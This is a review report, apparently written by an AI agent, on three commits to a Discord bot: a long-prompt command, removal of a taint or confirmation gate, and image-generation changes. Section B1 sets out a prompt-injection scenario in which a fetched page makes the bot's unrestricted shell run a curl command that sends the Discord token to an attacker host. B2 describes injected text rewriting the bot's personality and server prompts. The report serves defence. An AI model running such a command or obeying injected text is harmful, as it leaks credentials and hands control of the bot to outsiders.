# Child report C — 723e7d8 longprompt, 085c95b taint removal, 4e4027a image unification (Opus, read-only)

Coordinator note: verbatim child output (HTML entities normalised). Dispositions in `../03-DISPOSITIONS.md`.
The child disclosed one boundary deviation: it wrote a scratch copy of the pre-4e4027a `bot_tools.py` to
`/tmp` and deleted it after reading. Nothing in the repository was changed.
Coordinator spot-verified: `_shell_whitelist` has no reader outside the `!shell` command and load/save
(`bot.py:2528,4543,6987-7013,8471-8487`); `env={**os.environ, ...}` at `bot_tools.py:5221`; `_turn_tool_names`
filters only `join_server` for non-admins (`bot.py:14176-14191`); no admin/owner check inside
`UpdateBasePersonalityTool`/`UpdateServerPromptTool` (`bot_tools.py:7667-7790`); `compose.yaml:91`
`restart: unless-stopped`; `PROVISIONING.md:39` 79 transferred provider fields; `_feature_env("ENABLE_IMAGE_GEN")`
without a detector (`config.py:248`); attachment fallback at `bot_tools.py:1381-1382`.

---

# Adversarial source review: 723e7d8, 085c95b, 4e4027a (HEAD c603cf2)

I stayed read-only. I did not import or run any application code or tests, read any private config, use Docker, or read `legacy/`. One breach: I wrote a scratch copy of `git show 4e4027a^:bot_tools.py` to `/tmp/old_bot_tools_4e4027a_parent.py` and deleted it straight after reading it. Nothing in the repository was changed.

**Top findings:**
- **High:** shell has no authorization at all, but the active docs say it does (B1).
- **High (likely):** an older image config will stop the canonical `dame-curie` bot from starting, and no doc warns about it (C1).
- **Medium:** the taint removal also dropped the gate on the personality and server-prompt rewrite tools, which the docs don't mention (B2).
- **Medium:** all three commits add new tests, which AGENTS.md forbids, and I found no recorded grant (G1).

---

## A. longprompt (723e7d8)

**How the command is parsed** (`bot.py:6391-6395`): `content = message.content[len(prefix):].strip()`, then `split(maxsplit=1)`. Commands are dispatched before any attachment ingestion (`bot.py:5784-5790`).

| Case | Result |
|---|---|
| `?longprompt` alone | Downloads the prompt as `prompt.txt`. If none is set, replies "No custom prompt set." plus usage. A whitespace-only stored prompt is truthy, so it downloads. |
| `?longprompt ` with trailing space/newline | Same as alone; `.strip()` removes it, so `args` is None. |
| `.txt` attached plus inline text | Usage reply, nothing stored (`args is not None`). |
| `PROMPT.TXT` | Accepted (`.lower().endswith(".txt")`). |
| `text/plain` file without `.txt` | Usage reply. `content_type` is never checked. |
| File over 512 KiB | Rejected before download on `attachment.size`, and again on the actual bytes. |
| DM | Stored under key `"DM"`, shared by all DMs. Admin-only. |
| Stored prompt over 512 KiB, on download | "Prompt exceeds the 512 KiB limit; nothing was changed or truncated." Only reachable by hand-editing the file. |

**Storage round-trip is lossless.** `prompt_storage.PromptStore.set_server` writes JSON with `ensure_ascii=False` (`utils.py:810`). There is no length cap and no CRLF/BOM normalization. A strict UTF-8 decode followed by encode returns the same bytes.

### A1: nothing downstream limits a 512 KiB prompt
- **Severity:** medium. **Status:** PLAUSIBLE (depends on the provider's context window).
- **Where:**
  - The whole prompt goes into every system prompt: `bot.py:14803-14815` and `jobs.py:490-493`.
  - For comparison, the model tool caps server prompts at 4000 chars as "context-killers" (`bot_tools.py:7751`), and ordinary text attachments are capped at 50,000 chars (`bot.py:632`).
- **Scenario:** an admin uploads a 300 KiB lore file. Every turn in that guild then carries roughly 75k+ tokens. It either overflows the context or costs a lot, on every reply.
- **Smallest fix:** add one sentence to `docs/LONGPROMPT.md` stating the per-turn cost, or use a smaller dedicated ceiling (root's call).

### A2: known `?prompt` defect, now hit more often
- **Severity:** low. **Status:** CONFIRMED.
- **Where:** `bot.py:6533-6545`.
- **What happens:**
  - Once longprompt makes >2000-char prompts normal, every `?prompt` view fails with Discord error 50035 and shows the generic public error.
  - `?prompt <text>` saves the prompt before its echo fails, so the admin sees an error for a save that worked.
- **Could the existing helper fix it?** Yes. `send_command_response(..., code_block=True)` (`response_observability.py:206`) splits into ≤1900-char chunks, and `debug`/`version`/`help` already use it. But a 512 KiB prompt would become about 280 messages.
- **Smallest fix (if root reverses the decision):**
  - For the view path above ~1900 chars, reply with a pointer to `longprompt`.
  - For the set path, send a short acknowledgement without the echo.
- **Does longprompt duplicate sending logic?** No. It sends short replies and a file directly, which the helper can't do.
- `bot.py:6540` also hardcodes `!prompt` in its reply; it should use `self.command_prefix`. This predates the commit.

### A3: LONGPROMPT.md uses the `?` prefix
- **Severity:** low. **Status:** CONFIRMED.
- **Where:** `docs/LONGPROMPT.md:7-9` use `?longprompt` and `?clearprompt`, against the `!command` convention for docs.
- The help line in `bot.py` uses `self.command_prefix` correctly.

---

## B. Taint removal (085c95b)

**Residue grep across the whole active tree:** no active code, prompt, tool description, `.env.example`, `docker/bot.env.example`, plugin or test still references `_confirmed`, `is_destructive`, `DISABLE_TAINT_GATE`, `!confirm`, or the removed methods. Nothing left dangling; the removed names and imports are gone.

### B1: shell has no authorization, and the docs say it does
- **Severity:** high. **Status:** CONFIRMED.
- **What the code does:**
  - **Whitelist does nothing:** `_shell_whitelist` is loaded, saved and edited by `!shell` (`bot.py:2528, 4543, 6980-7015, 8471-8487`), but nothing reads it. That was already true before 085c95b.
  - **Help advertises it anyway:** `?help` lists "shell whitelist (admin)" (`bot.py:6974`).
  - **Offered to everyone:** `_turn_tool_names` filters only `join_server` for non-admins (`bot.py:14176-14191`), and `tool_prompts.py:99` invites all users to use shell.
  - **Only validation is empty/length:** `ShellTool._validate_command` (`bot_tools.py:5196-5203`).
  - **Full environment is inherited:** `env={**os.environ, ...}` (`bot_tools.py:5221`). That includes `DISCORD_TOKEN` and every API key, because dotenv is loaded with `override=True`.
- **Where it runs:** container root with `cap_drop: ALL` and outbound network.
  - Writable mounts: `/state/data` (including `admins.json` and control files), `/config/prompts`, `/state/sites` (which the publisher mirrors publicly) and `/state/shell` (`compose.yaml:86-160`).
  - The circuit breaker only reacts to failures, and the concurrency slot is scheduling; neither is a security control.
- **Remaining controls, in full:**
  - Who can start a turn: blacklist/ignore, channels, wake phrase, `bot_enabled`.
  - `ENABLE_SHELL`, which defaults to on, and `disabled_tools`.
  - The container-only check (`bot_tools.py:5214`).
  - The outer rootless engine with no host socket or host network.
  - Prompt guidance to the model.
- **Doc mismatches:**
  - `docs/ARCHITECTURE.md:47` says "independent tool authorization remain", and `:15` says "Preserve independent permissions".
  - `README.md:12` says "independent tool authorization".
  - `phase-II_v2/REDESIGN_PLAN.md:32` says the amendment "does not remove admin/owner checks", implying such checks exist for shell. None exist.
  - `SECURITY.md` says nothing about the model-directed shell posture.
  - Only `docs/STATUS.md:38` is accurate: the whitelist and prompt guidance are not enforced authorization.
- **Scenario:** a page fetched by `fetch_url`, or by the automatic `web_search` prefetch (`bot.py:12485-12507`), tells the model to run `curl attacker --data "$DISCORD_TOKEN"`. It runs, and output redaction never sees it.
- **Smallest fix (docs only):**
  - State in ARCHITECTURE.md §Direct shell and in SECURITY.md that shell has no per-user authorization and inherits all credentials.
  - Mark `!shell` as inert. Removing or wiring the command is a feature decision for root.

### B2: the personality and server-prompt tools lost their gate too
- **Severity:** medium. **Status:** CONFIRMED.
- **Why:** the old dispatcher gate applied to *any* tool with `is_destructive`. `UpdateBasePersonalityTool` and `UpdateServerPromptTool` had it set to True (diff at old `bot_tools.py:7880-7940`).
- **Neither tool checks for an admin** (`bot_tools.py:7683-7722, 7741-7775`).
- **Result:** on a turn that read web content, injected text can now rewrite the global personality or a server prompt permanently.
- The commit message and ARCHITECTURE describe the change only as "model-directed shell risk".
- **Smallest fix:** add one sentence to ARCHITECTURE.md §Direct shell and STATUS.md.

### B3: stale wording
- **Severity:** low. **Status:** CONFIRMED.
- `jobs.py:499` tells background jobs to "Preserve tool execution and confirmation rules". Now only `confirm_name` exists.
- Dated `phase-II_v2/` records still say taint/confirmation "remain":
  - DIRECT_SHELL_IMPLEMENTATION.md:22, DISCORD_ONLY_DEPLOYMENT.md:102, SOURCE_BOUNDARIES_IMPLEMENTATION.md:58, COMPANION_REMOVAL.md:30
  - SOCIAL_TRANSPORT_REMOVAL.md:23/31, EMAIL_REMOVAL.md:22, RUNTIME_VALIDATION.md:94
  - PRUNING_MAP.md:6/32/101/110/199 (below its "historical" banner)
- `tool_prompts.py:107` ("Prompt Injection Defense") is guidance to the model, not a claim about a gate.

### B4: the removed gate was already partial
- **Severity:** info.
- It only ever marked turns where `fetch_url`/`web_search` ran. It never covered Discord text, text attachments (up to 50k chars), RAG-recalled `web_result` rows (`RAG_WEB_STORE_ENABLED` defaults to true), YouTube, or autonomy.
- `!confirm` was never admin-gated.
- So the real change is same-turn web reads, including the automatic prefetch.

---

## C. Image unification (4e4027a)

### C1: an older image config stops startup, with no warning for canonical Dame
- **Severity:** high. **Status:** mechanism CONFIRMED; effect on canonical Dame PLAUSIBLE (private config not read).
- **The checks:**
  - `validate()` (`config.py:482-502`) raises if `IMAGE_GEN_PROTOCOL` is not `images`.
  - It also raises if `IMAGE_GEN_MODEL` is set without a matching key in `IMAGE_GEN_MODELS`.
  - Both checks run even when `ENABLE_IMAGE_GEN=false`.
  - It is called from `MaxwellBot.__init__` (`bot.py:2361`). Malformed `IMAGE_GEN_MODELS` JSON fails earlier, at config import (`config.py:377`), which also breaks `doctor.py`.
- **Why the old config fails:** the old `.env.example` had `IMAGE_GEN_PROTOCOL=pollinations` and `IMAGE_GEN_MODEL=gpt-image-2`, and would fail both checks.
- **Why canonical Dame is likely affected:** its `bot.env` received "79 allowlisted provider environment fields" copied from V1 on 2026-09-19 (`phase-II_v2/PROVISIONING.md:39`). The canonical bot service is `restart: unless-stopped` (`compose.yaml:91`), so a failed start becomes a crash-restart loop.
- **Nothing warns about it:** STATUS.md, TODO.md and IMAGE_GENERATION.md don't list migrating the canonical config as a prerequisite. The IMAGE_GENERATION.md "Migration" section is generic and never says startup will refuse.
- **Smallest fix:**
  - Add a canonical-cutover item to STATUS.md/TODO.md.
  - Add one sentence to IMAGE_GENERATION.md: "a leftover non-`images` protocol, or an unmatched `IMAGE_GEN_MODEL`, stops startup even when image generation is disabled."
  - Optionally wrap the image checks in `if cls.ENABLE_IMAGE_GEN:`.

### C2: three different quality defaults
- **Severity:** low. **Status:** CONFIRMED.
- `config.py:379` defaults to `low`. `.env.example:218` and the IMAGE_GENERATION.md example say `high`.
- The schema default (`tool_schemas.py:807`) follows the runtime value, so it is at least consistent with what actually runs.
- The old `hd_image` edits defaulted to `high`. Instances without the key now edit at `low`.
- **Smallest fix:** make `config.py` and `.env.example` agree.

### C3: an unconfigured image tool is still registered and advertised
- **Severity:** low-medium. **Status:** CONFIRMED.
- `ENABLE_IMAGE_GEN` has no detection function, so "auto" means on (`config.py:248`), and the feature report says "on by default".
- The model sees the tool, and every call returns "Error: image generation is not configured…" (`bot_tools.py:1398-1407`) and counts as a failure toward the circuit breaker.
- Before this commit, keyless Pollinations worked by default. `docker/bot.env.example` has no `IMAGE_GEN_*` keys, so instances built from it lose image generation without notice.
- **Smallest fix:** add a detection function in the same style as `ENABLE_TTS`, checking `IMAGE_GEN_BASE_URL` and a non-empty `IMAGE_GEN_MODELS`.

### C4: input handling
- **Severity:** info/low. **Status:** CONFIRMED.
- **The premise that `hd_image` had a private-IP refusal is false.** No `_private_url` and no `ipaddress` check ever existed (`git log -S` finds nothing). `_is_safe_url` has accepted private networks since the initial commit; the old "refusing to fetch private/internal URL" message was simply wrong.
- Redirect refusal and the 20 MiB limit on URL and file inputs are kept (`bot_tools.py:1294-1320`).
- **Downscaling:** the old `_shrink` ran only on the removed `chat_completions` path, and native `images` never downscaled. If `hd_image` previously ran on its `chat_completions` default, edits now upload full size: up to 4 × 20 MiB, about 107 MB of base64 JSON. PLAUSIBLE latency regression.
- **Data URIs** are unbounded (the doc admits this).
- **Local paths** use `abspath`, not `realpath` (`bot_tools.py:1328`). A symlink in the shell-writable `/state/sites/_images` can escape the allowlist. That adds nothing while shell is ungated.

### C5: generating from scratch is impossible when the message has an image
- **Severity:** low. **Status:** CONFIRMED.
- `if not refs: refs = self._attached_images(message)` (`bot_tools.py:1381-1382`) means any call without `image` becomes an edit whenever the triggering message carries an image.
- `image=[]` and `image=""` also fall back to the attachments.
- The old `image_generator` never used attachments.
- **Smallest fix:** change the fallback condition to `if image is None:`.

### C6: no alias for the old tool name
- **Severity:** low. **Status:** CONFIRMED.
- `_TOOL_ALIASES` (`bot.py:13359-13385`) has no `hd_image` entry. Dirac's channel memory already holds `Called hd_image…` traces, so stale calls return "unknown tool".
- **Smallest fix:** add `"hd_image": "image_generator"`.
- **Also check (PLAUSIBLE):** whether the private `disabled_tools` list includes `image_generator` (the old Pollinations tool). If so, image generation is now fully disabled.
- **Remaining `hd_image` strings:** only in the synthetic fixtures `tests/test_log_console_render.py:46` and `tests/test_log_console_events.py:22-40`, and in `phase-II_v2/` history.
- `KNOWN_TOOLS`, `RESULT_TOOL_NAMES`, `CHAT_CORE_TOOL_NAMES`, the drift test, `image_or_caption_delivered` (`bot.py:2096`) and the `__IMAGE_SENT__` prefix are all consistent.

### C7: `_image_generator_properties` is safe
- **Severity:** info. **Status:** CONFIRMED.
- The outer dict is copied and `model`/`quality` are replaced with copies, so the shared `TOOL_PARAMETERS` is never mutated.
- `enum` is the only one in the catalog, but it is standard JSON schema. `default` was already sent for `auto_send`, and Dirac's live traffic since 10:04Z has accepted these schemas.
- **Nits:**
  - The model catalog appears twice, in the tool description and in the `model` description.
  - The description can exceed the 1024-char limit (`tool_schemas.py:846`), which truncates the text copy of the catalog.

### C8: empty-string arguments cause errors
- **Severity:** low. **Status:** PLAUSIBLE.
- Some models fill optional arguments with `""`.
- `model=""` gives "model must be an exact ID". `quality=""` is sent to the provider as-is.
- **Smallest fix:** treat an empty value as omitted, for example `model or None`.

---

## D. Tool dispatcher (`bot.py:13347-13483`)

- **Severity:** info. **Status:** CONFIRMED coherent.
- `result_text` starts as `""`, and every branch assigns it: disabled, platform, unknown tool, breaker open, execute (falling back to "executed successfully"), and the exception path (`"Error - {e}"`, never empty).
- A breaker failure is recorded both for "Error…" results and for exceptions.
- `record_reasoning` always runs, after the result is set.
- There are no references to removed names. `redact_sensitive_text` was removed from `bot.py` along with its last use in 6859025.
- The XML and native paths both go through this one function (`bot.py:13705`).
- Nit: `startswith(("Error", "Error:"))` is redundant.

---

## G1: new tests against the contract

- **Severity:** medium (process). **Status:** CONFIRMED against AGENTS.md; whether root granted it verbally is unknown.
- AGENTS.md says: "No new tests, especially tests asserting removed features… are absent."
- **What the commits added:**
  - 723e7d8 adds `tests/test_longprompt_command.py` (15 tests).
  - 085c95b adds `test_dispatch_allows_shell_after_fetch`, which asserts that the removed gate is gone.
  - 4e4027a adds 31 test functions and removes 31, including new config and schema tests.
- I found no recorded grant in TODO.md or STATUS.md.
